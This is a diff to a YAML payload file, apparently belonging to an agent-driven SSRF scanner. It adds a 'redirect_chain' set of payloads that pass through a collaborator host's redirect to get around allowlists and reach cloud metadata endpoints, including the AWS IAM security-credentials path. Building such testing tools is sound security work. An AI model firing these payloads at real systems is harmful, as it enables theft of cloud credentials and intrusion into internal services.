@@ -27,6 +27,20 @@ payloads:
     - "http://169.254.170.2/v2/metadata"           # ECS metadata
     - "http://100.100.100.200/latest/meta-data/"   # Alibaba Cloud
 
+  redirect_chain:
+    # 5-B-2 allowlist bypass via the collaborator's 302: the target's SSRF
+    # allowlist sees the COLLABORATOR host (external), the server-side fetch
+    # follows the redirect to the internal `to` target (URL-encoded; the
+    # listener refuses external targets). The /follow/ template is the
+    # deterministic proof the fetch FOLLOWED: the second-stage request lands
+    # back on the collaborator under follow/<TOKEN>.
+    - "http://{{COLLAB_HOST}}:{{COLLAB_PORT}}/redirect/{{TOKEN}}?to=http%3A%2F%2F{{COLLAB_HOST}}%3A{{COLLAB_PORT}}%2Ffollow%2F{{TOKEN}}"
+    - "http://{{COLLAB_HOST}}:{{COLLAB_PORT}}/redirect/{{TOKEN}}?to=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
+    - "http://{{COLLAB_HOST}}:{{COLLAB_PORT}}/redirect/{{TOKEN}}?to=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F"
+    - "http://{{COLLAB_HOST}}:{{COLLAB_PORT}}/redirect/{{TOKEN}}?to=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2F"
+    - "http://{{COLLAB_HOST}}:{{COLLAB_PORT}}/redirect/{{TOKEN}}?to=http%3A%2F%2F169.254.170.2%2Fv2%2Fmetadata"
+    - "http://{{COLLAB_HOST}}:{{COLLAB_PORT}}/redirect/{{TOKEN}}?to=http%3A%2F%2F127.0.0.1%2F"
+
 # Parameter name heuristics — agent probes these first
 url_param_keywords:
   - url
